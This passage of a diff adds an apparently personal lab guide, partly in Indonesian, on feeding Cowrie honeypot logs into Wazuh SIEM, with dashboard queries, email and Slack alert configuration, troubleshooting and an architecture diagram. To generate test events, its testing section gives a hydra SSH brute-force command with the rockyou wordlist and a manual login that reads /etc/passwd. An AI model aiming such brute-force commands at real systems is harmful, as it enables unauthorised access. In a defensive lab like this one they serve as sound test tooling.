+3. Create pattern: wazuh-alerts-*
+
+### 9.2 Create Cowrie Dashboard
+
+1. Go to **Visualize** → **Create visualization**
+2. Create visualizations:
+   - **Pie Chart:** Top attacking IPs
+   - **Line Chart:** Attack timeline
+   - **Data Table:** Recent commands executed
+   - **Metric:** Total honeypot events
+
+### 9.3 Sample Queries
+
+**Find all Cowrie events:**
+\`\`\`
+rule.groups: cowrie OR rule.groups: honeypot
+\`\`\`
+
+**Find successful honeypot logins:**
+\`\`\`
+rule.id: 100101
+\`\`\`
+
+**Find brute force attacks:**
+\`\`\`
+rule.id: 100103
+\`\`\`
+
+## 10. Alert Configuration
+
+### 10.1 Email Alerts
+
+Edit ossec.conf di Wazuh Manager:
+
+\`\`\`xml
+<ossec_config>
+  <global>
+    <email_notification>yes</email_notification>
+    <smtp_server>smtp.gmail.com</smtp_server>
+    <email_from>wazuh-alerts@yourdomain.com</email_from>
+    <email_to>admin@yourdomain.com</email_to>
+  </global>
+  
+  <email_alerts>
+    <email_to>admin@yourdomain.com</email_to>
+    <level>12</level>
+    <rule_id>100101, 100105, 100106</rule_id>
+  </email_alerts>
+</ossec_config>
+\`\`\`
+
+### 10.2 Slack/Webhook Integration
+
+\`\`\`bash
+sudo vim /var/ossec/etc/ossec.conf
+\`\`\`
+
+\`\`\`xml
+<integration>
+  <name>slack</name>
+  <hook_url>https://hooks.slack.com/services/YOUR/WEBHOOK/URL</hook_url>
+  <level>12</level>
+  <alert_format>json</alert_format>
+</integration>
+\`\`\`
+
+## 11. Testing Integration
+
+### 11.1 Generate Test Events
+
+Dari machine lain, attack honeypot:
+
+\`\`\`bash
+# SSH brute force
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.110
+
+# Manual SSH
+ssh root@192.168.56.110
+# Password: admin
+# Run commands: whoami, ls, cat /etc/passwd
+\`\`\`
+
+### 11.2 Verify in Dashboard
+
+1. Login ke Wazuh Dashboard
+2. Go to **Security Events**
+3. Filter: rule.groups: cowrie
+4. Verify events appear
+
+### 11.3 Check Alerts
+
+\`\`\`bash
+# On Wazuh Manager
+sudo cat /var/ossec/logs/alerts/alerts.json | jq 'select(.rule.id >= 100100 and .rule.id <= 100199)'
+\`\`\`
+
+## 12. Maintenance
+
+### 12.1 Log Rotation
+
+\`\`\`bash
+# Wazuh handles log rotation automatically
+# Check configuration
+sudo cat /var/ossec/etc/internal_options.conf | grep -i rotate
+\`\`\`
+
+### 12.2 Index Management
+
+1. Dashboard → **Stack Management** → **Index Lifecycle Policies**
+2. Configure retention (e.g., 90 days)
+
+### 12.3 Regular Updates
+
+\`\`\`bash
+# Update Wazuh Manager
+sudo apt update && sudo apt upgrade wazuh-manager
+
+# Update Wazuh Agent (on honeypot)
+sudo apt update && sudo apt upgrade wazuh-agent
+\`\`\`
+
+## 13. Troubleshooting
+
+### Agent Not Connecting:
+
+\`\`\`bash
+# Check agent logs
+sudo tail -f /var/ossec/logs/ossec.log
+
+# Check connectivity
+telnet 192.168.56.120 1514
+\`\`\`
+
+### Rules Not Triggering:
+
+\`\`\`bash
+# Test decoder
+sudo /var/ossec/bin/wazuh-logtest
+
+# Paste sample Cowrie log and check parsing
+\`\`\`
+
+### Dashboard Not Loading:
+
+\`\`\`bash
+sudo systemctl status wazuh-dashboard
+sudo tail -f /var/log/wazuh-dashboard/wazuh-dashboard.log
+\`\`\`
+
+## 14. Architecture Summary
+
+\`\`\`
+┌────────────────────────────────────────────────────────┐
+│                    MONITORING FLOW                      │
+├────────────────────────────────────────────────────────┤
+│                                                        │
+│  Attacker → SSH/Telnet → Cowrie Honeypot              │
+│                              │                         │
+│                              ▼                         │
+│                    Cowrie Logs (JSON)                  │
+│                              │                         │
+│                              ▼                         │
+│                    Wazuh Agent                         │
+│                              │                         │
+│                              ▼ (TCP 1514)              │
+│                    Wazuh Manager                       │
+│                    (Decoding & Rules)                  │
+│                              │                         │
+│                              ▼                         │
+│                    Wazuh Indexer                       │
+│                              │                         │
+│                              ▼                         │
+│                    Wazuh Dashboard                     │
+│                    (Visualization)                     │
+│                              │                         │
+│                              ▼                         │
+│                    Alert (Email/Slack)                 │
+│                                                        │
+└────────────────────────────────────────────────────────┘
+\`\`\`
+
+## 15. Checklist
+
+| Component | Status |
+|-----------|--------|
+| Wazuh Server installed | ✅ |
+| Wazuh Dashboard accessible | ✅ |
+| Wazuh Agent on honeypot | ✅ |
+| Agent registered & connected | ✅ |
+| Cowrie log monitoring configured | ✅ |
+| Custom decoders created | ✅ |
+| Custom rules created | ✅ |
+| Test events visible | ✅ |
+| Alerts configured | ✅ |
+
+## 16. Kesimpulan
+
+Setup Wazuh SIEM dengan integrasi Cowrie Honeypot telah selesai. Sistem sekarang dapat:
+
+✅ Mendeteksi serangan SSH/Telnet secara real-time  
+✅ Mencatat semua aktivitas penyerang  
+✅ Memberikan alert untuk aktivitas berbahaya  
+✅ Visualisasi serangan melalui dashboard  
+✅ Centralized log management  
+
+### Kemampuan Deteksi:
+- Brute force attacks
+- Successful honeypot compromise
+- Malicious command execution
+- Malware download attempts
+- Attack patterns dan trends
+
+**System Status:** Fully Operational ✅  
+**Monitoring:** Active 24/7  
+**Alert Level:** Configured
+
+---
+
+**Experimenter:** Lubellion  
+**Documentation:** Complete  
+**Lab Environment:** Production-ready
+    `
   }
 ];
 
